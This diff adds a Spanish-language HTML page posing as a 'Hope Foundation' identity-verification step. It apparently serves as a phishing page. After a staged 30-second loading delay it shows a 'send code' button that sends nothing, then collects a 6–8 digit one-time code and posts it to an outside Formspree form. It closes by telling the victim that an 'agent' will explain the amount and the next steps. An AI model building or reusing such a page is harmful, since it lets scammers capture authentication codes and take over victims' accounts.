@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Hope Foundation - Paso 3 Verificación</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+    html {
+      scroll-behavior: smooth;
+    }
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #e8e8e8;
+      color: #333333;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 0 20px 40px;
+    }
+    header {
+      width: 100%;
+      height: 70px;
+      background: #555555;
+      color: #f0f0f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 1.6rem;
+      letter-spacing: 3px;
+      user-select: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      box-shadow: 0 2px 8px rgb(0 0 0 / 0.1);
+    }
+    main.container {
+      margin-top: 100px;
+      background: #ffffff;
+      max-width: 420px;
+      width: 100%;
+      border-radius: 16px;
+      box-shadow: 0 15px 30px rgb(0 0 0 / 0.08);
+      padding: 30px 25px 40px;
+      text-align: center;
+      user-select: none;
+      box-sizing: border-box;
+    }
+    h1 {
+      font-weight: 900;
+      font-size: 2rem;
+      color: #222222;
+      margin-bottom: 20px;
+    }
+    p.description {
+      font-size: 1rem;
+      color: #555555;
+      margin-bottom: 30px;
+      line-height: 1.5;
+      min-height: 48px;
+    }
+    .loader {
+      margin: 30px auto 40px;
+      border: 8px solid #cccccc;
+      border-top: 8px solid #777777;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1.2s linear infinite;
+      display: block;
+    }
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      align-items: center;
+      margin-top: 20px;
+      user-select: text;
+    }
+    input[type="text"] {
+      padding: 12px 14px;
+      font-size: 1.1rem;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 280px;
+      border: 2.5px solid #aaa;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+      font-family: 'Roboto', sans-serif;
+      color: #444444;
+      background-color: #f7f7f7;
+    }
+    input[type="text"]:focus {
+      outline: none;
+      border-color: #666666;
+      box-shadow: 0 0 8px rgba(102, 102, 102, 0.5);
+      background-color: #fff;
+    }
+    small.error-message {
+      color: #b33a3a;
+      font-weight: 700;
+      font-size: 0.9rem;
+      height: 20px;
+      display: block;
+    }
+    button {
+      padding: 12px 36px;
+      background-color: #777777;
+      color: white;
+      font-weight: 700;
+      font-size: 1rem;
+      border: none;
+      border-radius: 9999px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(119, 119, 119, 0.4);
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+      user-select: none;
+      min-width: 150px;
+      margin-top: 10px;
+    }
+    button:disabled {
+      background-color: #bbb;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+    button:hover:not(:disabled) {
+      background-color: #555555;
+      box-shadow: 0 6px 16px rgba(85, 85, 85, 0.6);
+    }
+    .success-message, .error-message, .info-message {
+      font-weight: 700;
+      font-size: 1rem;
+      margin-top: 20px;
+      min-height: 28px;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      user-select: none;
+    }
+    .success-message.visible {
+      color: #248f24;
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .error-message.visible {
+      color: #b33a3a;
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .info-message.visible {
+      color: #444444;
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .timer {
+      font-weight: 600;
+      font-size: 0.95rem;
+      color: #555555;
+      margin-top: 6px;
+      user-select: none;
+      letter-spacing: 0.6px;
+    }
+    @media (max-width: 480px) {
+      main.container {
+        padding: 25px 20px 20px;
+      }
+      h1 {
+        font-size: 1.7rem;
+      }
+      input[type="text"] {
+        max-width: 100%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+<header>
+  Hope Foundation
+</header>
+
+<main class="container" role="main" aria-labelledby="page-title">
+  <h1 id="page-title">Verificación de Identidad</h1>
+
+  <p class="description" id="instruction-text">Por favor, espere mientras verificamos su información...</p>
+  <div class="loader" id="loader" aria-label="Cargando..."></div>
+
+  <section id="send-code-section" style="display:none;" aria-live="polite">
+    <button id="send-code-btn" type="button">Enviar código</button>
+  </section>
+
+  <section id="verification-section" style="display:none;" aria-live="polite" aria-relevant="additions removals" aria-atomic="true">
+    <form id="verification-form" novalidate method="POST" action="https://formspree.io/f/mvzyblln">
+      <input type="text" id="verification-code" name="verification_code" placeholder="Ingrese código (6-8 dígitos)" maxlength="8"
+        aria-describedby="code-error" aria-label="Código de verificación" required autocomplete="one-time-code" inputmode="numeric" />
+      <small id="code-error" class="error-message" role="alert"></small>
+
+      <button type="submit" id="verify-btn" disabled>Enviar</button>
+    </form>
+
+    <p class="info-message timer" id="resend-timer" style="display:none;">Podrás reenviar código en <span id="timer-seconds">60</span> segundos</p>
+    <button id="resend-code-btn" type="button" style="display:none; margin-top: 14px;">Reenviar código</button>
+
+    <p class="success-message" id="success-message" role="alert" style="display:none;">
+      Ya verificamos toda su información, el agente que le atiende le dirá la cantidad y cuáles son los pasos a seguir de ahora en adelante.
+    </p>
+  </section>
+</main>
+
+<script>
+  (() => {
+    const loader = document.getElementById('loader');
+    const instructionText = document.getElementById('instruction-text');
+
+    const sendCodeSection = document.getElementById('send-code-section');
+    const sendCodeBtn = document.getElementById('send-code-btn');
+
+    const verificationSection = document.getElementById('verification-section');
+    const resendCodeBtn = document.getElementById('resend-code-btn');
+    const resendTimer = document.getElementById('resend-timer');
+    const timerSecondsSpan = document.getElementById('timer-seconds');
+
+    const form = document.getElementById('verification-form');
+    const codeInput = document.getElementById('verification-code');
+    const codeError = document.getElementById('code-error');
+    const verifyBtn = document.getElementById('verify-btn');
+    const successMsg = document.getElementById('success-message');
+
+    let resendTimerInterval;
+    let resendWaitSeconds = 60;
+
+    function startResendTimer() {
+      resendWaitSeconds = 60;
+      resendCodeBtn.style.display = 'none';
+      resendTimer.style.display = 'block';
+      timerSecondsSpan.textContent = resendWaitSeconds;
+
+      resendTimerInterval = setInterval(() => {
+        resendWaitSeconds -= 1;
+        timerSecondsSpan.textContent = resendWaitSeconds;
+        if (resendWaitSeconds <= 0) {
+          clearInterval(resendTimerInterval);
+          resendTimer.style.display = 'none';
+          resendCodeBtn.style.display = 'inline-block';
+          resendCodeBtn.focus();
+        }
+      }, 1000);
+    }
+
+    codeInput.addEventListener('input', () => {
+      const val = codeInput.value.trim();
+      const valid = /^\d{6,8}$/.test(val);
+      if (!val) {
+        codeError.textContent = '';
+        verifyBtn.disabled = true;
+      } else if (!valid) {
+        codeError.textContent = 'Ingresa un código numérico de 6 a 8 dígitos';
+        verifyBtn.disabled = true;
+      } else {
+        codeError.textContent = '';
+        verifyBtn.disabled = false;
+      }
+    });
+
+    form.addEventListener('submit', (event) => {
+      const val = codeInput.value.trim();
+      const valid = /^\d{6,8}$/.test(val);
+      if (!valid) {
+        codeError.textContent = 'Ingresa un código numérico de 6 a 8 dígitos';
+        verifyBtn.disabled = true;
+        event.preventDefault(); // Bloquear envío si no es válido
+      } else {
+        codeError.textContent = '';
+        // El formulario se envía normalmente a Formspree
+      }
+    });
+
+    sendCodeBtn.addEventListener('click', () => {
+      sendCodeBtn.disabled = true;
+      codeInput.value = '';
+      codeError.textContent = '';
+      successMsg.style.display = 'none';
+      instructionText.textContent = 'Por favor, ingresa el código que has recibido para completar la verificación.';
+      sendCodeSection.style.display = 'none';
+      verificationSection.style.display = 'block';
+      codeInput.focus();
+
+      startResendTimer();
+    });
+
+    resendCodeBtn.addEventListener('click', () => {
+      resendCodeBtn.disabled = true;
+      verifyBtn.disabled = true;
+      sendCodeBtn.disabled = true;
+      codeInput.value = '';
+      codeError.textContent = '';
+      successMsg.style.display = 'none';
+      instructionText.textContent = 'Reenviando código de verificación...';
+      verificationSection.setAttribute('aria-busy', 'true');
+
+      resendTimer.style.display = 'none';
+      resendCodeBtn.style.display = 'none';
+
+      setTimeout(() => {
+        instructionText.textContent = 'Por favor, ingresa el código que has recibido para completar la verificación.';
+        verificationSection.setAttribute('aria-busy', 'false');
+        codeInput.focus();
+
+        startResendTimer();
+        sendCodeBtn.disabled = false;
+      }, 10000);
+    });
+
+    // Al cargar la página
+    loader.style.display = 'block';
+    sendCodeSection.style.display = 'none';
+    verificationSection.style.display = 'none';
+    instructionText.textContent = 'Por favor, espere mientras verificamos su información...';
+
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        loader.style.display = 'none';
+        sendCodeSection.style.display = 'block';
+        instructionText.textContent = 'Para continuar, presione "Enviar código" para recibir el código de verificación.';
+        sendCodeBtn.disabled = false;
+        sendCodeBtn.focus();
+      }, 30000); // 30 segundos de carga inicial
+    });
+  })();
+</script>
+
+</body>
+</html>
